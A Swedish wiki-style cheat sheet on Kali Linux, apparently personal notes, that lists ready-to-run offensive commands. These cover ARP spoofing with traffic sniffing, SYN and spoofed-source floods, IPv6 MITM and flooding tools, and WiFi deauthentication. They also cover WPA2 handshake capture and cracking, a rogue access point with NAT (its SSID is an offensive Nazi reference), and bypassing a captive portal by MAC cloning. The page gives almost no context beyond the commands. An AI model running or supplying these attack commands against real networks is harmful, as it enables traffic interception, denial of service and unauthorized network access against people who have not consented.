---
title: Kali Linux
permalink: /Kali_Linux/
---

[Category:Distar](/Category:Distar "wikilink") Kali Linux är en
Debian-baserad Linuxdistribution avsedd för digitala penetrationstester
och etisk hacking. Kali är uppföljaren till BackTrack.

<https://www.kali.org/>

Grundsetup
==========

**IP**

`ifconfig eth0 10.0.0.5/24 up`
`route add default gw 10.0.0.1`
`echo nameserver 8.8.8.8 > /etc/resolv.conf`

**SSH-server**

`start networking`
`sshd-generate`
`start ssh`
`update-rc.d -f ssh defaults`

Docker
------

Et snabbt sätt att komma igång med Kali är med docker.

`docker pull kalilinux/kali-linux-docker`
`docker run -t -i kalilinux/kali-linux-docker /bin/bash`
`root@aaca1ac4f5b5:/# ping 8.8.8.8`

Verktyg
=======

Kali är utrustat med väldigt många verktyg. Här listas några och vad de
används till.

**[Nmap](/Nmap "wikilink")**
Security Scanner

**Yersinia**
Attacker mot det mesta som har med nätverk att göra, inkl DHCP, STP,
CDP, DTP, HSRP, VTP, 802.1q, 802.1x. Startas med:

`yersinia -G`

**ARPSpoof**

`echo 1 > /proc/sys/net/ipv4/ip_forward`
`arpsoof -i eth0 -t 10.0.0.15 10.0.0.1`
`arpsoof -i eth0 -t 10.0.0.1 10.0.0.15`

Samla sedan data

`driftnet -i eth0`
`urlsnarf -i eth0`

**TCP Synflood**

`use auxiliary/dos/tcp/synflood`
`set RHOST 192.168.1.1`
`set SHOST 10.0.0.50`
`run`

**Hydra**
Password cracker

**Maltego**
Gather information about ip addresses and domains

**[Metasploit](/Metasploit "wikilink")**
Vulnerability testing

**Burp Suite**
Proxy/Spider

**[Scapy](/Scapy "wikilink")**
Packet Manipulation Tool

**Hping3** - TCP Ping

`hping3 -S 10.10.10.10 -a 10.10.10.12 -p 22 --flood`

**Parasite6** - IPv6 MITM

`echo 1 > /proc/sys/net/ipv6/conf/all/forwarding`
`parasite6 -lR eth0`

Wireless
========

Börja med att konfa svenska inställningar

`iw reg set SE`
`iwconfig wlan0 txpower 27`

**Uncovering Hidden SSID**

`airmon-ng start wlan0`
`airodump-ng mon0`
`airodump-ng -c 11 mon0`
`aireplay-ng -0 2 -a [BSSID] mon0`

`iwconfig wlan0 essid [ESSID] channel 11`
`macchanger -m [MAC address] wlan0`

**WPA2**

`airmon-ng start wlan0`
`airodump-ng -w OURFILE -c 11 --bssid [BSSID] mon0`
`aireplay-ng -0 2 -a [BSSID] mon0`
`aircrack-ng OURFILE-01.cap -w /pentest/passwords/wordlists/darkc0de.lst`

`wpaclean <out.cap> <in.cap>`

with crunch:

`crunch x X "characters" | aircrack-ng ".cap file" -w - -e "essid"`

with john the ripper:

`john -stdout -incremental:all | aircrack-ng ".cap file" -w - -e "essid"`

**Rogue AP**

`apt-get install dhcp3-server -y`
`mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.bak`
`nano /etc/dhcp3/dhcpd.conf`
` ddns-update-style ad-hoc;`
` default-lease-time 600;`
` max-lease-time 7200;`
` subnet 192.168.1.0 netmask 255.255.255.0 {`
` option subnet-mask 255.255.255.0;`
` option broadcast-address 192.168.1.255;`
` option routers 192.168.1.1;`
` option domain-name-servers 192.168.1.1;`
` range 192.168.1.10 192.168.1.100;`
`} `

`airmon-ng start wlan0`
`airodump-ng mon0`
`airbase-ng --essid "Hitlerklubben" -c 11 mon0`
`ifconfig at0 192.168.1.1/24 up`
`route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1`
`dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0`
`/etc/init.d/dhcp3-server start`
`iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE`
`iptables --append FORWARD --in-interface at0 -j ACCEPT`
`echo 1 > /proc/sys/net/ipv4/ip_forward`

**Bridging**

`airmon-ng start wlan0`
`airodump-ng mon0`
`airbase-ng --essid "Hitlerklubben" -c 11 mon0`
`ifconfig at0`
`brctl addbr BR1`
`brctl addif BR1 eth0`
`brctl addif BR1 at0`
`brctl show`
`ifconfig eth0 0.0.0.0 up`
`ifconfig at0 0.0.0.0 up`
`ifconfig BR1 192.168.1.50/24 up`
`echo 1 > /proc/sys/net/ipv4/ip_forward`

IPv6
====

Med IPv6 finns det mycket att tänka på och testa.

`fake_router6 eth0 2001::/64`
`detect-new-ip6 eth0`
`dos-new-ip6 eth0`
`flood_router6 eth0`
`flood_advertise6 eth0`
`implementation6 eth0 2001::1`
`smurf6 eth0 2001::1`

Captive portal
==============

Många företag tex hotel använder en captive portal för att kontrollera
vilka som använder deras trådlösa nätverk.

Många portaler filtrerar på MAC så om man hittar en som fungerar via en
ipscan så räcker det för att komma åt internet.